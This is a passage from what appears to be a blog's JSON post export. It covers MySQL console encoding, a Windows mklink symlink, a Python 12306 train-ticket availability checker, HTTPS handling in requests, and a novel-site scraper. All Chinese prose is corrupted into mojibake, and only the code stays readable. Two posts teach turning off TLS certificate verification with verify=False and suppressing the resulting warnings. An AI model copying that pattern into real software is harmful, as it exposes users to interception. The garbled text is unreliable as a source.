cmdå®¢æˆ·ç«¯é»˜è®¤ç¼–ç ä¸ºâ€gbkâ€ç¼–ç ï¼Œmysqlæˆ‘è®¾ç½®çš„é»˜è®¤ç¼–ç æ˜¯â€utf8â€,åœ¨cmdä¸­æŒ‡æ˜mysqlçš„ç¼–ç å’Œæƒ³è¦çš„ç¼–ç å³å¯ã€‚ æ“ä½œæ­¥éª¤ æ‰“å¼€cmd,è¾“å…¥mysql -u root -pï¼Œè¾“å…¥å¯†ç è¿›å…¥mysqläº¤äº’ç•Œé¢ è®¾ç½®ç¼–ç set character_set_client=gbk; å†è®¾ç½®set character_set_results=gbk;å†é‡æ–°æ‰§è¡ŒæŸ¥è¯¢è¯­å¥çœ‹åˆ°ä¸­æ–‡å·²ç»æ˜¾ç¤ºæ­£å¸¸","categories":[{"name":"æµ‹è¯•","slug":"æµ‹è¯•","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"cmd","slug":"cmd","permalink":"http://yoursite.com/tags/cmd/"},{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"}]},{"title":"Windowsåˆ›å»ºè½¯è¿æ¥","slug":"windowsåˆ›å»ºè½¯è¿æ¥","date":"2018-06-28T16:00:00.000Z","updated":"2018-12-17T02:30:56.819Z","comments":true,"path":"2018/06/29/windowsåˆ›å»ºè½¯è¿æ¥/","link":"","permalink":"http://yoursite.com/2018/06/29/windows%E5%88%9B%E5%BB%BA%E8%BD%AF%E8%BF%9E%E6%8E%A5/","excerpt":"","text":"mklinkå‘½ä»¤åœ¨C:\\Users\\PEI\\OneDriveç›®å½•ä¸‹åˆ›å»ºD:\\blogç›®å½•çš„è½¯è¿æ¥ï¼Œå¹¶ä¸”åˆ›å»ºåçš„è½¯è¿æ¥ç›®å½•å‘½åä¸ºhexo_blog 1mklink &#x2F;D C:\\Users\\PEI\\OneDrive\\hexo_blog D:\\blog ç¬¬ä¸€ä¸ªå‚æ•° /Då‚æ•°è¡¨ç¤ºåˆ›å»ºçš„æ˜¯ä¸€ä¸ªç›®å½•çš„è½¯è¿æ¥ï¼Œä¸æ·»åŠ è¿™ä¸ªå‚æ•°é»˜è®¤çš„æ˜¯æ–‡ä»¶çš„è½¯é“¾æ¥ ç¬¬äºŒä¸ªå‚æ•° C:\\Users\\PEI\\OneDrive&lt;font color=green&gt;hexo_blogä¸ºè½¯è¿æ¥æ‰€åœ¨çš„ç›®å½•ï¼Œhexo_blogæ˜¯åˆ›å»ºè½¯è¿åé‡å‘½åçš„ç›®å½• ç¬¬ä¸‰ä¸ªå‚æ•° D:\\blogæ˜¯æºç›®å½• æ³¨æ„ï¼šä»¥ç®¡ç†å‘˜æƒé™æ‰“å¼€CMDè¿è¡Œæ­¤å‘½ä»¤ï¼Œå¦åˆ™ä¼šæç¤ºæƒé™ä¸è¶³ã€‚peili","categories":[{"name":"æµ‹è¯•","slug":"æµ‹è¯•","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"cmd","slug":"cmd","permalink":"http://yoursite.com/tags/cmd/"},{"name":"Windows","slug":"Windows","permalink":"http://yoursite.com/tags/Windows/"}]},{"title":"12306ç«è½¦ç¥¨æŸ¥è¯¢","slug":"12306è½¦ç¥¨æŸ¥è¯¢","date":"2018-06-02T13:00:00.000Z","updated":"2019-01-15T03:17:12.220Z","comments":true,"path":"2018/06/02/12306è½¦ç¥¨æŸ¥è¯¢/","link":"","permalink":"http://yoursite.com/2018/06/02/12306%E8%BD%A6%E7%A5%A8%E6%9F%A5%E8%AF%A2/","excerpt":"","text":"å‰è¨€é€šè¿‡12306å®˜ç½‘çš„å‡ ä¸ªæ¥å£æ¥è·å–ç«è½¦ä½™ç¥¨ä¿¡æ¯ï¼Œç»“åˆé‚®ä»¶æ¨¡å—å‘ç°ä½™ç¥¨æ—¶å°±å‘é€é‚®ä»¶ç»™è‡ªå·±æç¤ºï¼Œè™½ç„¶è¾¾ä¸åˆ°é»„ç‰›é‚£ç§æ¯«ç§’çº§åˆ«ï¼Œç§’çº§åˆ«çš„é€Ÿåº¦ï¼Œåœ¨ä¸ç¹å¿™çš„çº¿è·¯å’Œæ—¶é—´æ®µè¿˜æ˜¯æœ‰ç‚¹ç”¨å¤„ã€‚æ³¨ï¼šç›®å‰ç‰ˆæœ¬åªåšäº†ä½™ç¥¨æŸ¥è¯¢ï¼ŒåæœŸæœ‰æ—¶é—´å†åŠ å…¥ç¥¨ä»·ä¿¡æ¯ç­‰ï¼Œç”±äº12306ç™»é™†éªŒè¯ç ä»¥åŠç™»é™†æ€çš„å¤±æ•ˆæ—¶é—´å®åœ¨å˜æ€ï¼Œè¦å®ç°å®Œå…¨è‡ªåŠ¨åŒ–è¿˜éœ€è´­ä¹°ä»˜è´¹äººå·¥æ‰“ç æœåŠ¡ï¼Œå› æ­¤æš‚æ—¶ä¸ä¸è®¡åˆ’åšè‡ªåŠ¨è´­ç¥¨åŠŸèƒ½ã€‚ æŸ¥è¯¢ä½™ç¥¨æ¥å£é¦–å…ˆæ‰“å¼€12306å®˜ç½‘ï¼Œå¹¶è¿›å…¥ä½™ç¥¨æŸ¥è¯¢é¡µé¢ï¼ŒåŒæ—¶å¼€å¯chromeæµè§ˆå™¨F12æ§åˆ¶å°ï¼Œä»¥åŒ—äº¬åˆ°ä¸Šæµ·ä¸ºä¾‹ï¼Œæœç´¢2018å¹´6æœˆ5æ—¥çš„ä½™ç¥¨ä¿¡æ¯ï¼Œç‚¹å‡»æœç´¢æŒ‰é’®ï¼Œå¯ä»¥åœ¨æ§åˆ¶å°å‘é€äº†ä¸€æ¡GETè¯·æ±‚ï¼Œè¯·æ±‚ç»“æœä»¥jsonå­—ç¬¦ä¸²çš„å½¢å¼æ”¾å›ï¼Œé‡Œé¢æœ‰æŸ¥è¯¢åˆ°çš„ä½™ç¥¨ä¿¡æ¯ã€‚ é€šè¿‡python-requestsæ¥è¯·æ±‚ä¸€ä¸‹è¿™ä¸ªæ¥å£ï¼Œæ¯”è¾ƒæ„å¤–çš„æ˜¯è¿™ä¸ªæ¥å£å¹¶æ²¡æœ‰æ ¡éªŒheaderä¿¡æ¯ï¼Œå› æ­¤æˆ‘ä»¬ä¸ç”¨æ·»åŠ headerã€‚åœ¨æµ‹è¯•ä¸­å‘ç°è™½ç„¶12306å®˜ç½‘ä¸»é¡µæä¾›äº†è¯ä¹¦ä¸‹è½½ï¼Œä½†æ˜¯è¿™ä¸ªhttpsè¯·æ±‚å¹¶ä¸æ˜¯å¿…é¡»æ ¡éªŒè¯ä¹¦ï¼Œå°†requestsæ–¹æ³•ä¸­çš„verifyå‚æ•°è®¾ç½®ä¸ºFalseå–æ¶ˆæ ¡éªŒä¹Ÿèƒ½æ­£å¸¸è¿”å›ç»“æœã€‚ 1234567import requestsurl = 'https://kyfw.12306.cn/otn/leftTicket/query?leftTicketDTO.train_date=2018-06-05&amp;leftTicketDTO.from_station=BJP&amp;leftTicketDTO.to_station=SHH&amp;purpose_codes=ADULT'requests.packages.urllib3.disable_warnings()r = requests.get(url,verify=False).json()yupiao = r['data']['result']print(yupiao) å¦‚ä¸‹å›¾è¿”å›ç»“æœæ˜¯ä¸ªåˆ—è¡¨ï¼Œæ¯ä¸€ä¸ªå…ƒç´ å°±æ˜¯ä¸€æ¡ç«è½¦çº¿è·¯ï¼ŒåŒ…å«å§‹å‘ç«™ä»£ç ï¼Œç»ˆç‚¹ç«™ä»£ç ï¼Œå‘è½¦æ—¶é—´ï¼Œæ¯ç§åº§ä½çš„ä½™ç¥¨ç­‰ä¿¡æ¯ï¼Œé€šè¿‡â€ | â€œåˆ†éš”ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯æ¯ç§åº§ä½çš„ä½™ç¥¨æ•°é‡ä¸ç½‘é¡µå±•ç¤ºçš„ä½ç½®å‰åé¡ºåºå¹¶ä¸æ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œè¿™ä¸ªèŠ±äº†ä¸å°‘æ—¶é—´æ¥ç¡®å®šæ¯ä¸ªå¯¹åº”å…³ç³»ã€‚ å°†ä¸Šä¸€æ­¥è¿”å›ç»“æœæ”¾å…¥å¾ªç¯ä¸­ï¼Œæ¯ä¸€ä¸ªå…ƒç´ æŒ‰ç…§â€ | â€œç¬¦å·åˆ†å‰²ï¼Œå¹¶ä»åˆ†å‰²åçš„åˆ—è¡¨ä¸­ä¾æ¬¡å–å‡ºéœ€è¦çš„å†…å®¹ï¼ˆåŸå¸‚ä»£ç ï¼Œæ—¶é—´ï¼Œè½¦æ¬¡ï¼Œä½œä¸ºä½™ç¥¨ç­‰ä¿¡æ¯ï¼‰ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839import requestsfrom tabulate import tabulate#æŸ¥è¯¢ä½™ç¥¨def query(): url = 'https://kyfw.12306.cn/otn/leftTicket/queryZ?leftTicketDTO.train_date=2018-06-05&amp;leftTicketDTO.from_station=BJP&amp;leftTicketDTO.to_station=SHH&amp;purpose_codes=ADULT' requests.packages.urllib3.disable_warnings() r = requests.get(url,verify=False).json() yupiao = r['data']['result'] table_header = ['è½¦æ¬¡','å§‹å‘ç«™','ç»ˆç‚¹ç«™','å§‹å‘æ—¶é—´','åˆ°ç«™æ—¶é—´','å†æ—¶','å•†åŠ¡ç‰¹ç­‰åº§','ä¸€ç­‰åº§','äºŒç­‰åº§','é«˜çº§è½¯å§','è½¯å§','åŠ¨å§','ç¡¬å§','è½¯åº§','ç¡¬åº§','æ— åº§'] #è¡¨æ ¼å¤´ table_data = [] #æ•°æ®æ·»åŠ è‡³åˆ—è¡¨ï¼Œä½œä¸ºè¡¨æ ¼çš„ä¸»ä½“å†…å®¹ for i in yupiao: a = i.split('|') #åˆ†å‰²å­—ç¬¦ä¸²ï¼Œaæ˜¯ä¸ªåˆ—è¡¨ is_null = a[0] #åˆ¤æ–­æ˜¯å¦æœ‰ç¥¨ train_code = a[3] #è½¦æ¬¡ start_city_code = a[4] #å§‹å‘ç«™åŸå¸‚ä»£ç  end_city_code = a[5] #ç»ˆç‚¹ç«™åŸå¸‚ä»£ç  start_time = a[8] #ç»ˆç‚¹ç«™å¼€å§‹æ—¶é—´ end_time = a[9] #ç»ˆç‚¹ç«™åˆ°è¾¾æ—¶é—´ total_time = a[10] #æ€»å…±å†æ—¶ shangwutedeng = a[32] #å•†åŠ¡ç‰¹ç­‰åº§ yideng = a[31] #ä¸€ç­‰åº§ erdeng = a[30] #äºŒç­‰åº§ gaojiruanwo = a[21] #é«˜çº§è½¯å§ ruanwo = a[23] #è½¯å§ dongwo = a[33] #åŠ¨å§ yingwo = a[28] #ç¡¬å§ ruanzuo = a[24] #è½¯åº§ yingzuo = a[29] #ç¡¬åº§ wuzuo = a[26] #æ— åº§ #æ·»åŠ åˆ°å…ƒç»„ yupiao_tuple = (train_code,start_city_code,end_city_code,start_time,end_time,total_time,shangwutedeng,yideng,erdeng,gaojiruanwo,ruanwo,dongwo,yingwo,ruanzuo,yingzuo,wuzuo) table_data.append(yupiao_tuple) print(tabulate(table_data,headers=table_header,tablefmt='grid')) åœ¨ä¸Šé¢ä»£ç ä¸­ä½¿ç”¨äº†tabulateåº“ï¼Œå®ƒå¯ä»¥æŠŠç»“æœè¾“å‡ºæˆæ˜“è¯»çš„è¡¨æ ¼æ ·å¼ï¼Œæ›´å¤šä½¿ç”¨æ–¹æ³•ç‚¹å‡»è¿™é‡Œã€‚ å‚æ•°åŒ–å‡†å¤‡å†å›å¤´çœ‹ä¹‹å‰è¯·æ±‚çš„URLï¼Œè¿™ä¸ªGETè¯·æ±‚æœ‰å››ä¸ªè¯·æ±‚å‚æ•°ï¼Œåˆ†åˆ«ä»£è¡¨å¦‚ä¸‹ï¼š 1234leftTicketDTO.train_date --&gt; ä¹˜è½¦æ—¥æœŸleftTicketDTO.from_station --&gt; å§‹å‘ç«™ä»£ç (ä¾‹å¦‚åŒ—äº¬åŒ—ï¼šVAP)leftTicketDTO.to_station --&gt; ç»ˆç‚¹ç«™ä»£ç (ä¾‹å¦‚ä¸Šæµ·è™¹æ¡¥ï¼šAOH)purpose_codes --&gt; è½¦ç¥¨ç±»å‹(æ™®é€šç¥¨ï¼šADULTï¼Œå­¦ç”Ÿç¥¨ï¼š0X00) ç¬¬ä¸€ä¸ªå’Œç¬¬å››ä¸ªå‚æ•°å¥½å¡«å†™ï¼Œå§‹å‘ç«™å’Œç»ˆç‚¹ç«™ä»£ç æˆ‘ä»¬ç°åœ¨å¹¶æ²¡æœ‰å¯¹åº”çš„è¡¨ï¼Œä¸çŸ¥é“æ¯ä¸ªç«™ç‚¹å¯¹åº”çš„ä»£ç ï¼Œåœ¨ç½‘ç«™ä¸Šæ‰¾ä¸€ä¸‹ã€‚æˆ‘ä»¬åœ¨é¡µé¢ä¸Šæ‰‹åŠ¨ä¿®æ”¹å§‹å‘ç«™å’Œç»ˆç‚¹ç«™çš„æ—¶å€™å‘ç°å¹¶æ²¡æœ‰å‘é€æ–°çš„httpsè¯·æ±‚ï¼Œå¯ä»¥çŒœæµ‹æ‰€æœ‰çš„ç«™ç‚¹ä¿¡æ¯åº”è¯¥æ˜¯åœ¨ä¸€ä¸ªjsæ–‡ä»¶é‡Œé¢ï¼Œç„¶åé€šè¿‡é¡µé¢çš„jsæ–¹æ³•æ¥é€‰æ‹©ä¸åŒçš„ç«™åï¼Œç°åœ¨F12æ§åˆ¶å°åˆ‡æ¢è‡³JSæ¨¡å—ä¸‹ï¼Œåˆ·æ–°è¿™ä¸ªä½™ç¥¨æŸ¥è¯¢é¡µé¢ã€‚ ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ°åˆ·æ–°é¡µé¢åæœ‰ä¸ªåç§°ä¸ºstation_name.jsçš„jsæ–‡ä»¶ï¼Œå•å‡»ä¸€çœ‹æœç„¶æ˜¯å­˜æ”¾äº†æ‰€æœ‰çš„ç«™ç‚¹ä¿¡æ¯ï¼Œå°†è¿™ä¸ªæ–‡ä»¶çš„urlå¤åˆ¶é‡æ–°æ‰“å¼€ä¸€ä¸ªé¡µé¢å¯ä»¥çœ‹åˆ°ï¼Œç«è½¦ç«™ç‚¹ä¿¡æ¯æ”¾åœ¨station_nameå˜é‡åé¢çš„å­—ç¬¦ä¸²ï¼Œä¸­é—´æœ‰å¾ˆå¤šâ€ | â€œä½œä¸ºåˆ†éš”ç¬¦ï¼Œè§‚å¯Ÿå‘ç°æ¯äº”ä¸ªç¬¦å·åˆ†éš”çš„å†…å®¹ä¸ºä¸€ç»„ï¼Œåˆšå¥½æ˜¯ä¸€ä¸ªç«™ç‚¹çš„ä¿¡æ¯ã€‚ æˆ‘ä»¬éœ€è¦æŠŠè¿™ä¸ªå¾ˆé•¿çš„å­—ç¬¦ä¸²é‡æ–°åˆ†éš”æˆæˆ‘ä»¬æƒ³è¦çš„æ ¼å¼ï¼Œå°†è¿™ä¸ªå¾ˆé•¿çš„å­—ç¬¦ä¸²å…¨éƒ¨å¤åˆ¶åˆ°ä¸€ä¸ªpyæ–‡ä»¶,é€šè¿‡ä»¥ä¸‹å‡½æ•°æ¥å¤„ç†ï¼š 123456#æŸ¥è¯¢æ¯ä¸ªç«™ç‚¹åç§°/æ‹¼éŸ³/ç¼©å†™/ä»£ç def get_station_code(): code = all_station.split('|') #å­—ç¬¦ä¸²çš„æ‰€æœ‰ä¿¡æ¯æŒ‰ç…§\"|\"ç¬¦å·åˆ†å‰²ï¼Œç»“æœæ˜¯ä¸€ä¸ªåˆ—è¡¨ n = 5 # å¤§åˆ—è¡¨ä¸­å‡ ä¸ªæ•°æ®ç»„æˆä¸€ä¸ªå°åˆ—è¡¨ï¼Œæ¯äº”ä¸ªå…ƒç´ ä¸ºä¸€ä¸ªç«™ç‚¹ä¿¡æ¯ç»„åˆ station_code = [code[i:i + n] for i in range(0, len(code), n)] #æ¯ä¸€ä¸ªç«è½¦ç«™ç‚¹ä¿¡æ¯ä¸ºä¸€ä¸ªå…ƒç´ æ”¾åœ¨æ­¤åˆ—è¡¨ print(station_code) æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼Œé•¿å­—ç¬¦ä¸²å·²ç»è¢«è½¬æ¢æˆä¸€ä¸ªå¤§åˆ—è¡¨ï¼Œåˆ—è¡¨ä¸­çš„æ¯ä¸ªå…ƒç´ åˆ†åˆ«æ˜¯ä¸€ä¸ªå°åˆ—è¡¨ï¼Œå°åˆ—è¡¨åŒ…å«ç«è½¦ç«™ç‚¹çš„äº”ä¸ªä¿¡æ¯ï¼Œå…¶ä¸­æœ€åä¸€ä¸ªå°åˆ—è¡¨åªæœ‰ä¸€ä¸ªå…ƒç´ ï¼Œåº”è¯¥æ˜¯å¤‡ç”¨çš„å­—æ®µç°åœ¨æ²¡æœ‰ç”¨ï¼Œç›´æ¥åˆ é™¤ã€‚ ç”¨æˆ·è¾“å…¥åˆ¤æ–­ä¸Šä¸€æ­¥å·²ç»æ•´ç†å¥½äº†æ‰€æœ‰çš„ç«è½¦ç«™ç‚¹ä¿¡æ¯ï¼Œä¸‹é¢ä»£ç å®ç°ç”¨æˆ·è¾“å…¥ç«è½¦ç«™åæ—¶æ‰¾åˆ°å¯¹åº”çš„ç«™ç‚¹ä»£ç ï¼Œ 1234567891011121314151617181920212223242526272829#æ ¹æ®ç”¨æˆ·è¾“å…¥çš„ç«™ç‚¹åæˆ–è€…ç¼©å†™åœ¨ç«™ç‚¹åˆ—è¡¨ä¸­æ£€ç´¢å¯¹åº”çš„ä»£ç def retrieve_station(): a = input('è¯·è¾“å…¥å§‹å‘ç«™ã€ç»ˆç‚¹ç«™ã€æ—¥æœŸï¼Œç”¨ä¸€ä¸ªç©ºæ ¼éš”å¼€ï¼ŒæŒ‰å›è½¦é”®æŸ¥è¯¢ï¼Œå‚è€ƒæ ¼å¼ï¼šåŒ—äº¬ ä¸Šæµ· 20180605\\n:') start_city = a.split(' ')[0] end_city = a.split(' ')[1] while True: date = str(a.split(' ')[2]) if len(date) == 8: #ç”¨æˆ·æ—¥æœŸæ˜¯å¦æ˜¯8ä½æ­£æ•´æ•° newdate = date[:4] + '-' + date[4:6] + '-' + date[6:] #è½¬æ¢ä¸ºæŸ¥è¯¢æ¥å£æ‰€éœ€çš„æ—¥æœŸå‚æ•°æ ¼å¼ï¼Œä¾‹å¦‚2018-06-08 break else: print('æ—¥æœŸè¾“å…¥æœ‰è¯¯ï¼Œè¯·é‡æ–°è¾“å…¥') #æ£€ç´¢å§‹å‘ç«™ä»£ç  for i in station_code: #station_codeå°±æ˜¯ä¸Šä¸€æ­¥æ•´ç†å¥½çš„ç«™ç‚¹åˆ—è¡¨ if start_city == i[1]: start_city_code = i[2] #å§‹å‘ç«™ä»£ç  break else: pass #æ£€ç´¢ç›®çš„åœ°ä»£ç  for i in station_code: #station_codeå°±æ˜¯ä¸Šä¸€æ­¥æ•´ç†å¥½çš„ç«™ç‚¹åˆ—è¡¨ if end_city == i[1]: end_city_code = i[2] #ç»ˆç‚¹ç«™ä»£ç  break else: pass return newdate,start_city_code,end_city_code ä¸Šé¢çš„å‡½æ•°æ‰§è¡Œåè¿”å›æ—¥æœŸ,å§‹å‘ç«™ä»£ç ï¼Œç»ˆç‚¹ç«™ä»£ç ï¼Œå°†å®ƒä»¬æ ¼å¼åŒ–ä¼ åˆ°è¯·æ±‚çš„URLä¸­é‡æ–°è¯·æ±‚å°±å¾—åˆ°äº†æƒ³è¦çš„ç»“æœï¼Œä¿®æ”¹ä¹‹å‰çš„æŸ¥è¯¢ä½™ç¥¨å‡½æ•°å¦‚ä¸‹ã€‚ 12345#æŸ¥è¯¢ä½™ç¥¨def query(): station_info = retrieve_station() url = 'https://kyfw.12306.cn/otn/leftTicket/query?leftTicketDTO.train_date=%s&amp;leftTicketDTO.from_station=%s&amp;leftTicketDTO.to_station=%s&amp;purpose_codes=ADULT' %(station_info[0],station_info[1],station_info[2]) ... æœ€ç»ˆæ•ˆæœxx","categories":[{"name":"æµ‹è¯•","slug":"æµ‹è¯•","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"æ¥å£æµ‹è¯•","slug":"æ¥å£æµ‹è¯•","permalink":"http://yoursite.com/tags/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/"}]},{"title":"requestsä¸­HTTPSè¯·æ±‚çš„å¤„ç†","slug":"requestsä¸­HTTPSè¯·æ±‚çš„å¤„ç†","date":"2018-04-27T12:30:00.000Z","updated":"2018-12-17T02:30:56.835Z","comments":true,"path":"2018/04/27/requestsä¸­HTTPSè¯·æ±‚çš„å¤„ç†/","link":"","permalink":"http://yoursite.com/2018/04/27/requests%E4%B8%ADHTTPS%E8%AF%B7%E6%B1%82%E7%9A%84%E5%A4%84%E7%90%86/","excerpt":"","text":"å‰è¨€åœ¨æ¥å£æµ‹è¯•æˆ–è€…çˆ¬è™«çš„æ—¶å€™ç»å¸¸é‡åˆ°HTTPSçš„è¯·æ±‚ï¼Œç›´æ¥ç”¨pythonä¸­requestsæ–¹æ³•è¯·æ±‚çš„è¯ä¼šå¯èƒ½å‡ºç°å¦‚ä¸‹æŠ¥é”™ã€‚ è§£å†³åŠæ³•åœ¨requestsæ·»åŠ verifyå‚æ•°ï¼Œverifyæ˜¯ç”¨æ¥éªŒè¯SSLè¯ä¹¦å¼€å…³ï¼Œé»˜è®¤æ˜¯Trueï¼Œå¦‚æœä¸æƒ³éªŒè¯çš„è¯å°†å®ƒè®¾ç½®ä¸ºFalse 12r = requests.get(url,verify=False)print(r.status_code) ç°åœ¨å·²ç»ä¸å½±å“è¯·æ±‚çš„ç»“æœï¼Œä½†æ˜¯æ¯æ¬¡è¯·æ±‚çš„æ—¶å€™ä¼šå‡ºç°è­¦å‘Šï¼Œçœ‹ç€æ¯”è¾ƒä¸èˆ’æœã€‚æƒ³è¦å»æ‰è¿™ä¸ªè­¦å‘Šæç¤ºï¼Œéœ€è¦åœ¨è¯·æ±‚ä¹‹å‰åŠ ä¸Šå¦‚ä¸‹ä»£ç ã€‚ 123requests.packages.urllib3.disable_warnings()r = requests.get(url,verify=False)print(r.status_code) peili","categories":[{"name":"çˆ¬è™«","slug":"çˆ¬è™«","permalink":"http://yoursite.com/categories/%E7%88%AC%E8%99%AB/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"æ¥å£æµ‹è¯•","slug":"æ¥å£æµ‹è¯•","permalink":"http://yoursite.com/tags/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/"},{"name":"çˆ¬è™«","slug":"çˆ¬è™«","permalink":"http://yoursite.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"pythonå°è¯´çˆ¬è™«","slug":"pythonå°è¯´çˆ¬è™«","date":"2018-04-25T12:30:00.000Z","updated":"2019-11-05T14:07:34.701Z","comments":true,"path":"2018/04/25/pythonå°è¯´çˆ¬è™«/","link":"","permalink":"http://yoursite.com/2018/04/25/python%E5%B0%8F%E8%AF%B4%E7%88%AC%E8%99%AB/","excerpt":"","text":"å‰è¨€å¾ˆä¹…æ²¡æœ‰å†™çˆ¬è™«äº†ï¼Œæœ€è¿‘æ¥åˆ°ä¸€ä¸ªæŠ“å–å°è¯´çš„é¡¹ç›®é¡ºä¾¿åšæ­¤çºªå½•ç»ƒç»ƒæ‰‹ï¼Œä¹‹åå·¥ä½œä¸­å¯èƒ½ä¹Ÿä¼šæœ‰éƒ¨åˆ†åœºæ™¯è¦ç”¨åˆ°çˆ¬è™«ï¼Œçˆ¬å–ç«äº‰å¯¹æ‰‹è¿›è¡Œæ•°æ®åˆ†æä»€ä¹ˆçš„ã€‚ç›®æ ‡ç½‘ç«™ï¼šæ½‡æ¹˜ä¹¦é™¢ç¯å¢ƒå‡†å¤‡ï¼š python3 requestsåº“ BeautifulSoupåº“ æ•´ä½“æ€è·¯æŠ“å–è¿™ä¸ªå°è¯´ç½‘ç«™å…è´¹æ¿å—çš„æ‰€æœ‰å†…å®¹ï¼ŒæŸ¥çœ‹é¡µé¢å‘ç°è¿™ä¸ªæ¿å—ä¸€å…±æœ‰6697é¡µï¼Œæ¯é¡µæœ‰20æœ¬å°è¯´ï¼Œé‚£æ•´ä½“æ€è·¯å°±æ˜¯å…ˆæŠ“å–æ¯é¡µçš„20ä¸ªå°è¯´åç§°å’Œurlï¼Œç„¶åè¿›å…¥æ¯æœ¬å°è¯´çš„é˜…è¯»åœ°å€ï¼Œæ‹¿åˆ°æ¯ä¸€ä¸ªç« èŠ‚çš„æ ‡é¢˜å’Œurlï¼ŒæŠ“å–æ¯ç« èŠ‚çš„æ­£æ–‡å†…å®¹å¹¶å†™åˆ°æœ¬åœ°txtæ–‡æœ¬ä¸­ã€‚ å•é¡µåˆ†æè¿™é‡Œè¯·æ±‚ä½¿ç”¨requestsï¼Œè§£æé¡µé¢ç”¨éå¸¸æ–¹ä¾¿çš„BeautifulSoupï¼Œåœ¨ä¸€ä¸ªæ–‡ç« æ ‡é¢˜ä¸Šå³é”®æ£€æŸ¥ï¼Œåœ¨é«˜äº®çš„è¿™æ¡aæ ‡ç­¾å³é”®ï¼Œcopy selectorï¼Œé€šè¿‡è¿™æ¡selectoræ¥å®šä½BeautifulSoupè§£æåå°è¯´æ‰€åœ¨çš„ä½ç½®ã€‚ 1body &gt; div.content &gt; div &gt; div &gt; div.inner-mainbar &gt; div.search-result &gt; div.result-list &gt; ul &gt; li:nth-child(1) &gt; div &gt; h4 &gt; a å…¶ä¸­li:nth-child(1)å¾ˆæ˜æ˜¾æ˜¯æŒ‡è¿™ä¸ªå°è¯´åœ¨å½“å‰é¡µé¢å°è¯´åˆ—è¡¨ä¸­æ’åˆ—ç¬¬ä¸€ä¸ªï¼Œæˆ‘ä»¬æƒ³è¦æœ¬é¡µé¢æ‰€æœ‰çš„20æœ¬å°è¯´ï¼Œæ‰€ä»¥å°±åˆ æ‰è¿™ä¸ª:nth-child(1)ï¼Œå†å°†selectorè¯­å¥ç²¾ç®€ä¸€ä¸‹åªè¦èƒ½å®šä½åˆ°å³å¯ï¼Œå¦‚ä¸‹ï¼š 1div.result-list &gt; ul &gt; li &gt; div &gt; h4 &gt; a ç„¶åå°†å®ƒå†™å…¥ä»£ç ï¼ŒprintæŸ¥çœ‹ä¸€ä¸‹ç»“æœã€‚ 1234567import requests,osfrom bs4 import BeautifulSoupwebdata = requests.get('http://www.xxsy.net/search?vip=0&amp;sort=2')soup = BeautifulSoup(webdata.text,'lxml')books = soup.select('div.result-list &gt; ul &gt; li &gt; div &gt; h4 &gt; a')print(books) ç»“æœæ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œåˆ—è¡¨ä¸­æœ‰20ä¸ªå…ƒç´ ï¼Œåˆ†åˆ«å¯¹åº”çš„20ä¸ªå°è¯´ï¼Œæˆ‘ä»¬æƒ³è¦çš„æ˜¯æ¯ä¸ªå…ƒç´ ä¸­hrefåé¢çš„é“¾æ¥å’Œå°è¯´çš„åå­—ï¼Œç”¨å¾ªç¯æå–å‡ºæ¥ã€‚ 123456...for book in books: bookname = book.text bookurl = 'http://www.xxsy.net' + book.get('href') bookid = book.get('href').split('/')[-1].split('.')[0] print(bookname,bookurl,bookid) è¿™æ ·å°±å¾ˆç®€å•çš„æ‹¿åˆ°äº†å•ä¸ªé¡µé¢20æœ¬å°è¯´çš„æ ‡é¢˜å’Œurlåœ°å€ï¼Œå¯ä»¥çœ‹åˆ°ä¸Šé¢æˆ‘æŠŠåœ°å€ä¸­çš„ä¸€ä¸²æ•°å­—ç”¨å•ç‹¬å–å‡ºæ¥äº†ï¼Œè¿™ä¸ªæ•°å­—å…¶å®å°±æ˜¯å°è¯´å¯¹åº”çš„å”¯ä¸€IDï¼Œåé¢è¦ç”¨åˆ°ã€‚ ç« èŠ‚åˆ†æç‚¹å‡»ä¸€ä¸ªå°è¯´è¿›å…¥è¯¦æƒ…é¡µé¢ï¼Œåˆ‡æ¢è‡³â€ä½œå“ç›®å½•â€ä¸‹å¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„ç« èŠ‚ï¼Œè¿™æ—¶å€™åœ¨ä¸€ä¸ªç« èŠ‚ä¸Šå³é”®æ£€æŸ¥ï¼Œè·Ÿä¸Šé¢æ–¹æ³•ä¸€æ ·ï¼ŒåŒæ ·å¯ä»¥å¾ˆç®€å•çš„è·å–åˆ°è¯¥å°è¯´æ‰€æœ‰ç« èŠ‚çš„åç§°å’Œurlåœ°å€ä»¥åŠç« èŠ‚IDã€‚ ä¸ºäº†åœ¨ä¸€ç¯‡æ–‡ç« ä»‹ç»å°½å¯èƒ½å¤šçš„æ–¹æ³•ï¼Œè¿™é‡Œæˆ‘ä¸ç”¨ä¸Šé¢è¿™ä¸ªåœ°æ–¹æ¥è·å–ç« èŠ‚ä¿¡æ¯ï¼Œä»å¦ä¸€ä¸ªåœ°æ–¹è¿›å…¥ã€‚ç‚¹å‡»â€œå¼€å§‹é˜…è¯»â€è¿›å…¥ç¬¬ä¸€ç« èŠ‚çš„æ­£æ–‡ï¼Œåœ¨é¡µé¢çš„å·¦è¾¹å¯ä»¥çœ‹åˆ°ä¸€ä¸ªâ€œç›®å½•â€æŒ‰é’®ï¼Œç‚¹çœ‹ä»¥åå°±èƒ½çœ‹åˆ°æ‰€æœ‰çš„ç« èŠ‚åç§°äº†ã€‚ç„¶è€Œåœ¨è¿™äº›ç« èŠ‚åç§°ä¸Šå³é”®å‘ç°å½“å‰é¡µé¢ç¦ç”¨äº†é¼ æ ‡å³é”®åŠŸèƒ½ï¼Œæ— æ³•æ£€æŸ¥å…ƒç´ 